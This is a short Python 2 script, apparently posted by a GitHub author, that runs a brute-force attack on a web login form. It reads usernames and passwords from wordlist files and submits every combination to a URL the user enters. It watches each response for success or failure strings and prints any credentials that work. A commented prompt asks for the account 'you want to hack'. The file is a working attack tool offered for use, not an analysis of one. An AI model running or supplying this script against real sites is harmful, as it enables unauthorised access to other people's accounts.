####################################
# => Brute Force Login <=          #
# By S4n1x D4rk3r                  #
# https://github.com/Sanix-Darker  #
####################################

import requests

print "\n#####################################"
print "# => Brute Force Login <=           #"
print "# By S4n1x D4rk3r                   #"
print "# https://github.com/Sanix-Darker   #"
print "#####################################"

# The link of the website
url = raw_input("\nEnter URL:")
# The userfield in the form of the login
userField = raw_input("\nEnter the User Field:")
# The passwordfield in the form
passwordField = raw_input("\nEnter the Password field:")
# list of potential incorrect message in the page if it doesn't succeed
incorrectMessage = ['incorrect', 'required error']
# list of potential success message in the page if it succeed
successMessage = ['success', 'SUCCESS']

# Getting list of potentials password
passwords = open('passwords.txt').readlines()
# Getting list of user to test with
users = open('users.txt').readlines()


print "Connecting to: "+url+"......\n"
# Put the target email you want to hack
#user_email = raw_input("\nEnter EMAIL / USERNAME of the account you want to hack:")
failed_aftertry = 0
for user in users:
    for password in passwords:
        dados = {userField: user.replace('\n', ''),
                 passwordField: password.replace('\n', '')}
        print dados
        # Doing the post form
        data = requests.post(url, data=dados)
        #print data.text
        if "404 - Not Found" in data.text:
            if failed_aftertry > 5:
                print "Connexion failed : Trying again ...."
                break
            else:
                failed_aftertry = failed_aftertry+1
                print "Connexion failed : 404 Not Found (Verify your link)"
        else:
            # if you want to see the text result decomment this
            #print data.text
            if incorrectMessage[0] in data.text or incorrectMessage[1] in data.text:
                print "Failed to connect with:\n user: "+user+" and password: "+password
            else:
                if successMessage[0] in data.text or successMessage[1] in data.text:
                    print "\n#######################################"
                    print "\nYOUPIII!! \nTheese Credentials succeed:\n> user: "+user+" and password: "+password
                    print "#######################################"
                    break
                else:
                    print "Trying theese parameters: user: "+user+" and password: "+password

Just_to_pause_the_script = raw_input("\n.")